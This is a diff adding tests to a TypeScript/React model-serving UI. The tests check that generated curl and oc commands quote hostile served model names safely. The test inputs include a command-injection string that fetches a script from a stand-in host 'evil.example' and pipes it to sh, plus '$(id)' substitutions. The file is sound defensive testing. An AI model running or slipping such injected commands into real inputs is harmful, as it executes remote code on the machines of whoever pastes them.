@@ -7,7 +7,7 @@ import type { CatalogModel, InferenceGatewayState, ModelExposureOption, ModelExp
 import { IDLE, modelsState } from "./featureState";
 import { cleanupBlocked, cleanupCandidates, cleanupSteps } from "./CleanupModal";
 import { envStatus } from "./resourceStatus";
-import { embeddingCurl, modelCurl, modelTokenLine, modelsConfirm, modelsSteps, thinkingCurl, toolCurl } from "./ModelsTab";
+import { UseModel, embeddingCurl, internalCurl, modelCurl, modelTokenLine, modelsConfirm, modelsSteps, thinkingCurl, toolCurl } from "./ModelsTab";
 
 const none: ResourceState = { deployed: false, ready: false, message: "Not deployed", managedByTool: false };
 const gateway: InferenceGatewayState = {
@@ -174,6 +174,32 @@ describe("Models runs and clean-up", () => {
       // One single-quoted body: no single quote inside it.
       expect(c.split("-d '")[1].slice(0, -1)).not.toContain("'");
     }
+  });
+
+  it("a served name a project editor chose cannot run anything when the commands are pasted", () => {
+    const base = "https://inference.apps.example.com/dev/m/";
+    const tok = "TOKEN=x";
+    const evil = [`x"}'; curl -s https://evil.example/p|sh; echo '`, "a$(id)", "a`id`", "two\nlines"];
+    // A single-quoted shell word: '...' runs with '\'' inside; anything else outside quotes would be shell syntax.
+    const singleQuoted = /^'(?:[^']|'\\'')*'$/;
+    for (const name of evil) {
+      for (const c of [modelCurl(base, name, tok), embeddingCurl(base, name, tok), toolCurl(base, name, tok), thinkingCurl(base, name, tok), internalCurl(base, name, false), internalCurl(base, name, true)]) {
+        const word = c.slice(c.indexOf("-d ") + 3);
+        expect(word).toMatch(singleQuoted);
+        // Unquoted, the word is exactly the JSON body, with the name as its "model".
+        const body = word.slice(1, -1).replace(/'\\''/g, "'");
+        expect((JSON.parse(body) as { model: string }).model).toBe(name);
+      }
+    }
+    // Names in the token command: plain ones bare, anything else quoted.
+    expect(modelTokenLine("dev", model("dev", { tokenSecret: "default-name-x-sa" }))).toContain("oc get secret default-name-x-sa -n dev ");
+    expect(modelTokenLine("d$(id)", model("dev", { tokenSecret: "a'b" }))).toContain(`oc get secret 'a'\\''b' -n 'd$(id)' `);
+  });
+
+  it("a model whose served name the backend withholds shows no commands", () => {
+    render(<UseModel model={model("dev", { tokenSecret: "default-name-qwen25-05b-instruct-sa", servedNameWithheld: true })} project="dev" onMaaS={() => undefined} readOnly={false} baseReason={null} onSetUpAgain={() => undefined} />);
+    expect(screen.getByText(/There are no commands for this model/)).toBeInTheDocument();
+    expect(screen.queryByRole("button", { name: /copy/i })).toBeNull();
   });
 
   it("a project with several models: the Overview shows a problem of any of them", () => {
